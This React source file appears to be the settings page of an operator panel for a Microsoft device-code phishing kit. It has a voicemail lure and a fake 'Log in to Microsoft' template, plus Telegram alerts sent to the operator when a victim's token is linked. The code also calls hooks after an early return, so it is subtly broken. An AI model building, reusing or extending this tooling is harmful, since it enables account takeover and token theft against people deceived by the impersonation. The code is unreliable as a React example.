import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { settingsApi } from '../../api/client';
import { PageSpinner } from '../../components/ui/Shared';
import { useState, useEffect } from 'react';

const templates = [
  {
    id: 'voicemail',
    name: 'Voicemail Message',
    desc: 'Shows a voicemail attachment card with sign-in steps and a dark code box. Best for email-based phishing scenarios.',
    preview: '📂 Voicemail_Message.mp3 → Copy code → Continue to Microsoft',
  },
  {
    id: 'microsoft',
    name: 'Microsoft Sign-in',
    desc: 'Clean, minimal Microsoft login page with "Log in to Microsoft" heading and a sign-in code field. Matches official Microsoft device login flow.',
    preview: 'Log in to Microsoft → Your Sign-in Code → Sign in at Microsoft',
  },
];

export default function Settings() {
  const qc = useQueryClient();
  const { data: settings, isLoading } = useQuery({ queryKey: ['settings'], queryFn: settingsApi.get });

  const updateMut = useMutation({
    mutationFn: ({ key, value }) => settingsApi.set(key, value),
    onSuccess: () => qc.invalidateQueries({ queryKey: ['settings'] }),
  });

  if (isLoading) return <PageSpinner />;

  const current = settings?.link_template || 'voicemail';

  const [tgToken, setTgToken] = useState('');
  const [tgChat, setTgChat] = useState('');

  useEffect(() => {
    if (settings) {
      setTgToken(settings.telegram_bot_token || '');
      setTgChat(settings.telegram_chat_id || '');
    }
  }, [settings]);

  const saveTelegram = () => {
    updateMut.mutate({ key: 'telegram_bot_token', value: tgToken });
    updateMut.mutate({ key: 'telegram_chat_id', value: tgChat });
  };

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold">Settings</h1>
        <p className="text-sm text-gray-500 mt-1">Configure panel and link page settings</p>
      </div>

      <div className="card-glow p-5">
        <h2 className="text-lg font-semibold mb-1">Link Page Template</h2>
        <p className="text-sm text-gray-500 mb-4">
          Choose which template is displayed when users visit the link page
        </p>

        <div className="grid gap-3">
          {templates.map(t => (
            <div
              key={t.id}
              onClick={() => updateMut.mutate({ key: 'link_template', value: t.id })}
              className={`rounded-lg border-2 p-4 cursor-pointer transition-all ${
                current === t.id
                  ? 'border-cyan-500 bg-cyan-500/5'
                  : 'border-dark-600 hover:border-dark-400'
              }`}
            >
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-3">
                  <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center ${
                    current === t.id ? 'border-cyan-500' : 'border-gray-500'
                  }`}>
                    {current === t.id && <div className="w-2 h-2 rounded-full bg-cyan-500" />}
                  </div>
                  <span className="font-semibold text-sm">{t.name}</span>
                </div>
                {current === t.id && (
                  <span className="text-xs bg-cyan-500/20 text-cyan-400 px-2 py-0.5 rounded-full font-medium">Active</span>
                )}
              </div>
              <p className="text-xs text-gray-400 ml-7 mb-2">{t.desc}</p>
              <div className="text-xs text-gray-600 ml-7 font-mono">{t.preview}</div>
            </div>
          ))}
        </div>

        {updateMut.isPending && (
          <p className="text-xs text-gray-500 mt-3">Saving...</p>
        )}
      </div>

      <div className="card-glow p-5">
        <h2 className="text-lg font-semibold mb-1">Telegram Notifications</h2>
        <p className="text-sm text-gray-500 mb-4">
          Get notified on Telegram when a new token is linked. Create a bot via <code className="bg-dark-700 px-1.5 py-0.5 rounded text-xs">@BotFather</code> and get your chat ID from <code className="bg-dark-700 px-1.5 py-0.5 rounded text-xs">@userinfobot</code>
        </p>

        <div className="space-y-3">
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-1">Bot Token</label>
            <input
              type="text"
              value={tgToken}
              onChange={e => setTgToken(e.target.value)}
              placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v..."
              className="w-full bg-dark-700 border border-dark-600 rounded-lg px-3 py-2 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-cyan-500"
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-1">Chat ID</label>
            <input
              type="text"
              value={tgChat}
              onChange={e => setTgChat(e.target.value)}
              placeholder="-1001234567890"
              className="w-full bg-dark-700 border border-dark-600 rounded-lg px-3 py-2 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-cyan-500"
            />
          </div>
          <button
            onClick={saveTelegram}
            disabled={updateMut.isPending}
            className="px-4 py-2 bg-cyan-600 hover:bg-cyan-500 text-white text-sm font-medium rounded-lg transition-colors disabled:opacity-50"
          >
            {updateMut.isPending ? 'Saving...' : 'Save Telegram Settings'}
          </button>
        </div>
      </div>
    </div>
  );
}
